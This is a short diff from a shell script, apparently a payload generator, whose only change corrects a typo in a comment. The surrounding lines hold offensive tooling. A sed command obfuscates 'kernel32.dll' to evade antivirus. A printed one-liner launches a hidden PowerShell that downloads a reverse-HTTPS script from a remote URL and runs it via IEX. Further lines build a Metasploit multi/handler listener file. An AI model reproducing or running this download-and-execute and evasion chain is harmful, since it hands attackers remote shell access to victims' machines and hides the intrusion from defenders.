@@ -155,7 +155,7 @@ sed -i 's,kernel32.dll,ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l,g' final_pshnet_revhttp
 printf "Final psh-net usage example:\n"
 printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
-# creating multu handler listener file
+# creating multi handler listener file
 printf "Creating multi handler script file...\n"
 printf "use exploit/multi/handler\n" > multihandler.rc
 printf "set PAYLOAD $payload\n" >> multihandler.rc
